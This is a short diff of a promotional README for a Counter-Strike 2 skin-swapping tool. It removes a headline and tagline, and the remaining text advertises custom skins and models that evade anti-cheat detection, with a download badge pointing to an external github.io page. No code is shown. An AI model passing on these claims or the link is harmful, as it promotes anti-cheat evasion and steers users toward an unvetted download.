@@ -1,7 +1,3 @@
-**Counter-Strike 2 Skin Swapper – Real-Time Custom Skins & Player Models, Undetected!** 🎮🎨  
-
-**Swap Weapons, Knives, and Player Models Instantly – Stay Stealthy in CS2!**  
-
 The **Counter-Strike 2 Skin Swapper** lets you transform your gameplay with **custom skins, player models**, and **equipment designs**, all while evading detection from anti-cheat systems. This open-source tool offers seamless, real-time customization for weapons, knives, and character models, ensuring you stand out in casual matches without risking bans.  
 
 **[![Download CS2 SkinSwapper](https://img.shields.io/badge/Download-CS2%20SkinSwapper-blueviolet)](https://cs2-skin-changer.github.io/.github/)**
